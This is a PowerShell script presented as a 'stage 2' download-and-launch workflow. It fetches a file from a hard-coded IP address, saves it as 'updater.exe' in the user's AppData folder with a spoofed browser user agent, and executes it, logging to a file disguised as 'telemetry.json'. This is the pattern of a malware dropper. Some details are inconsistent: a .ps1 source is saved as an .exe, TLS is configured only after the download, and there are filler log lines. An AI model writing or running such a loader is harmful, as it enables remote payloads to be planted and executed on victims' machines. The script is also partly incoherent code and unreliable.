<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://198.51.100.75/stage1.ps1",
    [string]$OutputPath = "$env:APPDATA\updater.exe",
    [string]$LogPath = "$env:TEMP\telemetry.json",
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$TransferTimeout = 121,
    [int]$RetryCount = 1,
    [int]$BackoffSeconds = 6
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 1,
        [int]$RetryDelay = 6,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $FetchUrl
    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $OutputPath -RetryCount $RetryCount -RetryDelay $BackoffSeconds -UserAgent $BrowserAgent
    if ($TransferResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $OutputPath
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $FetchUrl
    Destination = $OutputPath
    RetryCount = $RetryCount
    TimeoutSec = $TransferTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Inspecting process list"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
Write-Verbose "Checking local path"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Start-Sleep -Seconds 45
